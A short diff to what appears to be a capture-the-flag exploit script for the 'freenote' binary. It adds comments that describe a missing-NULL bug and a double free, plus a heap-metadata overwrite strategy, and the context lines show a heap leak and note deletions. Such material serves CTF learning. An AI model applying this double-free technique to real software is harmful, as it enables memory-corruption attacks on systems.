@@ -59,6 +59,20 @@ def leak_heap():
     log.info('leaked heap: 0x%x' % l)
     return l
 
+
+#
+# 'freenote' has two critical vulnerabilities.
+#
+# 1) does not append trailing NULL when it reads string from stdin.
+# 2) you can free() already freed chunks.
+#
+# exploit strategy will be
+#
+# 1) alloc & free 3 chunks
+# 2) alloc carefully crafted memory overlapping with already free'ed memory region. 
+#    (thus overwriting the metadata)
+# 3) free the chunk again 
+#
 if __name__ == "__main__":
     r.recvuntil('Your choice:')
 
@@ -113,3 +127,7 @@ if __name__ == "__main__":
     delete_note(2)
     delete_note(1)
     delete_note(0)
+
+    #
+    #
+    #
